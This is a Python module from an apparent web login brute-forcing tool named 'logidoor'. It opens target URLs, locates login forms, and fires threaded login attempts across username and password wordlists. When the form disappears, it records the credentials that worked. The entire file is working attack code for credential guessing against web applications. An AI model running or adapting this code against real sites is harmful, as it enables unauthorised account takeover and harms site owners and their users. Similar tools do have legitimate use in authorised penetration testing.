import threading
import queue

from logidoor.libs.browser import Browser
from logidoor.libs.cli.progressbar import printg
from logidoor.libs.cli.printf import *


def send_login(browser, url, username, password, result):
    # resp = browser.login(username, password)
    # Limit length of string using format
    # https://stackoverflow.com/a/24076314
    if not browser.login_form.entry_text:
        printg(f"Password: \033[95m{password:50.50}\033[0m")
    else:
        printg(f"Username: \033[96m{username:29.29}\033[0m Password: \033[95m{password:29.29}\033[0m")
    browser.login(username, password)
    # TODO analysis more from here
    if not browser.find_login_form():
        if browser.login_form.entry_text:
            print_found(username, password)
            result.put([url, username, password])
            return True
        else:
            print_found(None, password)
            result.put([url, None, password])
            return True
    else:
        return False


def run_threads(threads):
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()


def setup_threads(browser, url, options, result):
    workers = []
    for username in options.userlist:
        for password in options.passlist:
            if len(workers) == options.threads:
                # When login is found, we added URL to queue list
                # We check the URL to detect if login is done
                if url in [check_urls[0] for check_urls in list(result.queue)]:
                    return
                run_threads(workers)
                del workers[:]
            worker = threading.Thread(target=send_login, args=(browser, url, username, password, result))
            worker.daemon = True
            workers.append(worker)
    if workers:
        run_threads(workers)
        del workers[:]


def setup_threads_no_username(browser, url, options, result):
    workers = []
    for password in options.passlist:
        if len(workers) == options.threads:
            # When login is found, we added URL to queue list
            # We check the URL to detect if login is done
            if url in [check_urls[0] for check_urls in list(result.queue)]:
                return
            run_threads(workers)
            del workers[:]
        worker = threading.Thread(target=send_login, args=(browser, url, None, password, result))
        worker.daemon = True
        workers.append(worker)
    if workers:
        run_threads(workers)
        del workers[:]


def do_attack(options):
    result = queue.Queue()

    for url in options.url:
        print_attack(url)
        browser = Browser()
        try:
            browser.open(url)
            login_form = browser.find_login_form()
            if login_form:
                browser.login_form = login_form
                if browser.login_form.entry_text:
                    # If login form contains both entry_text and entry_password
                    if not options.userlist:
                        print_error(f"Username is required for current URL")
                    else:
                        setup_threads(browser, url, options, result)
                else:
                    # Only password, we setup different
                    setup_threads_no_username(browser, url, options, result)
            else:
                print_no_login_found(url)
        except KeyboardInterrupt:
            exit(0)
        finally:
            # TODO print table of login here
            browser.close()

    print_results(list(result.queue))
